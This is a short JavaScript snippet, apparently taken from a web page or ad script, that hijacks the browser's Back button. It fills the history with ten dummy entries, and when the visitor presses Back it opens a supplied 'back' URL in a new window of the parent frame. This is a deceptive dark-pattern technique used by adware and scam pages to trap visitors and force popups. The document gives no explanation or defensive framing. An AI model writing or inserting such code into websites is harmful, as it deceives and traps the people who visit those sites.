if (typeof back !== "undefined" && back !== null) {
  !(function () {
    var t;
    try {
      const URL = window.location.href.split(/[#]/)[0];
      for (t = 0; t < 10; ++t) history.pushState({}, "", URL + "#");
      onpopstate = function (event) {
        event.state && window.parent.open(back, "_blank"); // Open in a new window of the parent window
      };
    } catch (o) {
      console.log(o);
    }
  })();
}
